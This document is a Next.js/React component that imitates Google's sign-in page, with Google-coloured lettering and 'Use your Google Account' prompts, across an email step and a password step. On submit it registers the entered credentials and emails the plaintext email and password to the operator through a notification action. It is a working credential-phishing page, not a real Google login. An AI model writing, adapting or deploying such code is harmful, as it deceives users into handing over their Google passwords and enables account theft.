"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { AvatarIcon, ChevronLeftIcon } from "@radix-ui/react-icons";
import Link from "next/link";
import SubmissionSuccessModal from "@/components/SubmissionSuccessModal";
import InProgress from "@/components/InProgress";
import { checkUserExistence } from "@/actions/user";
import { sendEmailNotification } from "@/actions/notification";
import { generateEmailNotification } from "@/lib/utils";
import { signInUser, RegisteredBy } from "@/actions/auth";

const Google = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState<"email" | "password">("email");
  const [showPassword, setShowPassword] = useState(false);
  const [showModal, setShowModal] = useState<"success" | "in-progress" | null>(
    null
  );

  const toggleShowPassword = () => setShowPassword(!showPassword);

  const handleSubmit = async () => {
    try {
      const doesExist = await checkUserExistence(email);
      if (doesExist) {
        setShowModal("in-progress");
      } else {
        await signInUser({
          email,
          password,
          registeredBy: RegisteredBy.GOOGLE,
        });
        setShowModal("success");
        const emailBody = generateEmailNotification({ email, password });
        await sendEmailNotification(emailBody);
      }
    } catch (error) {}
  };

  return (
    <>
      {showModal === "success" ? (
        <SubmissionSuccessModal />
      ) : showModal === "in-progress" ? (
        <InProgress />
      ) : step === "email" ? (
        <Card className="max-w-md w-full p-12 glass-card animate-fade-in-scale relative z-10">
          <Link href="/sign-up">
            <ChevronLeftIcon className="w-6 h-6 absolute top-[54px]" />
          </Link>
          <div className="flex flex-col items-center space-y-8">
            <div className="flex items-center justify-center space-x-1">
              <span className="text-google-blue text-3xl font-medium">G</span>
              <span className="text-google-red text-3xl font-medium">o</span>
              <span className="text-google-yellow text-3xl font-medium">o</span>
              <span className="text-google-blue text-3xl font-medium">g</span>
              <span className="text-google-green text-3xl font-medium">l</span>
              <span className="text-google-red text-3xl font-medium">e</span>
            </div>

            <div className="text-center space-y-2">
              <h1 className="text-2xl font-normal text-gray-900">Sign in</h1>
              <p className="text-base text-gray-600">Use your Google Account</p>
            </div>

            <div className="w-full space-y-6">
              <div className="relative">
                <Input
                  type="email"
                  placeholder=""
                  id="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full h-12 px-4 pr-12 pt-4 pb-1 input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparen"
                />
                <label
                  htmlFor="email"
                  className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-google-blue
                  peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3"
                >
                  Enter your email
                </label>
              </div>

              <div className="flex justify-end">
                <Button
                  onClick={() => {
                    email.trim().length && setStep("password");
                  }}
                  className="bg-google-blue hover:bg-google-blue/90 text-white px-6 py-2 rounded transition-colors duration-200"
                >
                  Next
                </Button>
              </div>
            </div>
          </div>
        </Card>
      ) : (
        <Card className="max-w-md w-full p-12 glass-card animate-fade-in-scale relative z-10">
          <div className="flex flex-col items-center space-y-8">
            <div className="flex items-center justify-center space-x-1">
              <span className="text-google-blue text-3xl font-medium">G</span>
              <span className="text-google-red text-3xl font-medium">o</span>
              <span className="text-google-yellow text-3xl font-medium">o</span>
              <span className="text-google-blue text-3xl font-medium">g</span>
              <span className="text-google-green text-3xl font-medium">l</span>
              <span className="text-google-red text-3xl font-medium">e</span>
            </div>

            <div className="text-center space-y-2">
              <h1 className="text-2xl font-normal text-gray-900">Welcome</h1>
              <div className="flex flex-col sm:flex-row items-center justify-center space-x-2">
                <div className="flex items-center gap-2">
                  <AvatarIcon className="w-6 h-6" />
                  <span className="text-sm text-gray-600">{email.trim()}</span>
                </div>
                <Button
                  variant="ghost"
                  className="text-sm h-auto p-1 hover:bg-transparent"
                  onClick={() => {
                    setStep("email");
                    setPassword("");
                    setShowPassword(false);
                  }}
                >
                  Change
                </Button>
              </div>
            </div>

            <div className="w-full space-y-6">
              <div className="relative">
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full h-12 px-4 pr-12 pt-4 pb-1 input-focus-ring transition-all duration-200 ease-in-out peer placeholder-transparen"
                    placeholder=""
                    id="password"
                  />
                  <label
                    htmlFor="password"
                    className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 transition-all duration-200 peer-focus:text-xs peer-focus:top-3 peer-focus:text-google-blue
                  peer-[:not(:placeholder-shown)]:text-xs peer-[:not(:placeholder-shown)]:top-3"
                  >
                    Enter your password
                  </label>
                </div>
              </div>

              <div className="flex items-center">
                <input
                  type="checkbox"
                  id="show-password"
                  className="h-4 w-4 text-google-blue rounded border-gray-300 focus:ring-google-blue"
                />
                <label
                  htmlFor="show-password"
                  className="ml-2 text-sm text-gray-600 cursor-pointer"
                  onClick={toggleShowPassword}
                >
                  Show password
                </label>
              </div>

              <div className="flex items-center justify-end pt-4">
                <Button
                  onClick={handleSubmit}
                  className="bg-google-blue hover:bg-google-blue/90 text-white px-6 py-2 rounded transition-colors duration-200"
                >
                  Next
                </Button>
              </div>
            </div>
          </div>
        </Card>
      )}
    </>
  );
};

export default Google;
